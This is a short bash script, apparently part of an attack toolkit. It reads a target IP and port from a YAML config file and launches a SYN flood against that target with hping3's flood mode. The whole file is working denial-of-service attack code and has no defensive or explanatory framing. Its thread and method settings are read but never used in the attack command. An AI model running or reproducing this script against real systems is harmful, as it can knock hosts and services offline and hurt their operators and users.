#!/bin/bash
# scripts/dos.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
TARGET_IP=$(yq e '.dos.target_ip' "$CONFIG_FILE")
TARGET_PORT=$(yq e '.dos.target_port' "$CONFIG_FILE")
METHOD=$(yq e '.dos.method' "$CONFIG_FILE")
THREADS=$(yq e '.dos.threads' "$CONFIG_FILE")

echo "Starting DoS Attack: $METHOD Flooding $TARGET_IP:$TARGET_PORT with $THREADS threads..."

# Execute SYN Flood attack using hping3
hping3 -S -p "$TARGET_PORT" --flood "$TARGET_IP"

echo "DoS Attack Completed."
